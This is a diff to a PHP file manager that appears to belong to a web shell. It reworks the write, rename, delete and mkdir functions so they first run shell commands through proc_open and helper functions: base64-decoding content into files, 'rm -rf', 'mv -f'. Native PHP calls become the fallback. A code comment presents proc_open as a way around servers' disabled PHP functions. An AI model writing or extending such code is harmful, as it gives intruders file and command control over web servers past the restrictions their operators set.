@@ -222,24 +222,89 @@ function fm_read($path, $max = 2097152) {
 }
 
 function fm_write($path, $content) {
+    // Try command execution (many servers allow proc_open even with disabled functions)
+    if (function_exists('proc_open')) {
+        // Use base64 to avoid shell escaping issues
+        $b64 = base64_encode($content);
+        
+        if (!is_win()) {
+            // Linux: decode base64 directly to file
+            $cmd = 'echo ' . escapeshellarg($b64) . ' | base64 -d > ' . escapeshellarg($path) . ' 2>&1';
+            $out = run_cmd($cmd);
+            
+            clearstatcache(true, $path);
+            if (@file_exists($path) && @filesize($path) > 0) {
+                return array('ok' => true, 'bytes' => @filesize($path), 'mode' => 'cmd_base64');
+            }
+            
+            // Alternative: use printf with hex
+            $hex = bin2hex($content);
+            $cmd = 'printf "" | cat > ' . escapeshellarg($path);
+            // Actually write via proc_open directly
+            $descriptors = array(0 => array('pipe', 'r'), 1 => array('file', '/dev/null', 'w'), 2 => array('file', '/dev/null', 'w'));
+            $process = @proc_open('cat > ' . escapeshellarg($path), $descriptors, $pipes);
+            if (is_resource($process)) {
+                @fwrite($pipes[0], $content);
+                @fclose($pipes[0]);
+                @proc_close($process);
+                
+                clearstatcache(true, $path);
+                if (@file_exists($path) && @filesize($path) == strlen($content)) {
+                    return array('ok' => true, 'bytes' => strlen($content), 'mode' => 'proc_cat');
+                }
+            }
+        }
+    }
+    
+    // Fallback: Native PHP
     $r = @file_put_contents($path, $content);
-    if ($r !== false) return array('ok' => true, 'bytes' => $r);
-    $f = @fopen($path, 'wb');
-    if (!$f) return array('ok' => false, 'error' => 'cannot open for writing');
-    $r = @fwrite($f, $content);
-    @fclose($f);
-    if ($r === false) return array('ok' => false, 'error' => 'write failed');
-    return array('ok' => true, 'bytes' => $r);
+    if ($r !== false) {
+        return array('ok' => true, 'bytes' => $r, 'mode' => 'native');
+    }
+    
+    $f = @fopen($path, 'w');
+    if ($f) {
+        $r = @fwrite($f, $content);
+        @fclose($f);
+        if ($r !== false) {
+            return array('ok' => true, 'bytes' => $r, 'mode' => 'fopen');
+        }
+    }
+    
+    return array('ok' => false, 'error' => 'All write methods failed');
 }
 
 function fm_rename($from, $to) {
+    // Try command execution first
     if (exec_best() !== '') {
-        $cmd = is_win() ? "move /Y " . sq($from) . " " . sq($to) : "mv -f " . sq($from) . " " . sq($to);
+        $cmd = is_win() 
+            ? "move /Y " . sq($from) . " " . sq($to)
+            : "mv -f " . sq($from) . " " . sq($to) . " 2>&1";
+        
         run_cmd($cmd);
-        if (@file_exists($to)) return array('ok' => true, 'mode' => 'cmd');
+        
+        // Verify rename
+        if (@file_exists($to) && !@file_exists($from)) {
+            return array('ok' => true, 'mode' => 'cmd');
+        }
     }
-    if (@rename($from, $to)) return array('ok' => true, 'mode' => 'native');
-    return array('ok' => false, 'error' => 'rename failed');
+    
+    // Fallback: Native PHP
+    if (@rename($from, $to)) {
+        return array('ok' => true, 'mode' => 'native');
+    }
+    
+    // Get error info
+    $error = 'rename failed';
+    if (!@file_exists($from)) {
+        $error = 'source file not found';
+    } elseif (@file_exists($to)) {
+        $error = 'destination already exists';
+    } elseif (!@is_writable(dirname($to))) {
+        $error = 'destination directory not writable';
+    }
+    
+    return array('ok' => false, 'error' => $error);
 }
 
 function fm_rmdir_rec($dir) {
@@ -256,29 +321,72 @@ function fm_rmdir_rec($dir) {
 }
 
 function fm_delete_one($p) {
+    // Try command execution first
     if (exec_best() !== '') {
         $q = sq($p);
-        $cmd = is_win()
-            ? (@is_dir($p) ? "rd /s /q $q" : "del /f /q $q")
-            : "rm -rf $q";
-        run_cmd($cmd);
+        
+        if (is_win()) {
+            $cmd = @is_dir($p) ? "rd /s /q $q" : "del /f /q $q";
+            run_cmd($cmd);
+        } else {
+            $cmd = "rm -rf $q 2>&1";
+            run_cmd($cmd);
+        }
+        
+        // Verify deletion
         if (!@file_exists($p)) return 'cmd';
     }
+    
+    // Fallback: Native PHP
     if (@is_dir($p) && !@is_link($p)) {
-        if (fm_rmdir_rec($p)) return 'native';
+        if (@is_writable($p)) {
+            if (fm_rmdir_rec($p)) return 'native';
+        }
     } else {
         if (@unlink($p)) return 'native';
     }
+    
     return false;
 }
 
 function fm_mkdir($path) {
+    // Try command execution first
     if (exec_best() !== '') {
-        run_cmd((is_win() ? "mkdir " : "mkdir -p ") . sq($path));
-        if (@is_dir($path)) return array('ok' => true, 'mode' => 'cmd');
+        $cmd = is_win() 
+            ? 'cmd /c mkdir ' . sq($path) 
+            : 'mkdir -p ' . sq($path) . ' 2>&1';
+        
+        run_cmd($cmd);
+        
+        // Verify creation
+        if (@is_dir($path)) {
+            @chmod($path, 0755);
+            return array('ok' => true, 'mode' => 'cmd');
+        }
+        
+        // Try alternative command
+        if (!is_win()) {
+            run_cmd('install -d -m 0755 ' . sq($path));
+            if (@is_dir($path)) {
+                return array('ok' => true, 'mode' => 'cmd_install');
+            }
+        }
     }
-    if (@mkdir($path, 0755, true)) return array('ok' => true, 'mode' => 'native');
-    return array('ok' => false, 'error' => 'mkdir failed');
+    
+    // Fallback: Native PHP
+    if (@mkdir($path, 0755, true)) {
+        return array('ok' => true, 'mode' => 'native');
+    }
+    
+    // Get error info
+    $error = 'mkdir failed';
+    if (@file_exists($path) && !@is_dir($path)) {
+        $error = 'file exists with same name';
+    } elseif (!@is_writable(dirname($path))) {
+        $error = 'parent directory not writable';
+    }
+    
+    return array('ok' => false, 'error' => $error);
 }
 function fm_download($path) {
     if (@is_file($path)) {
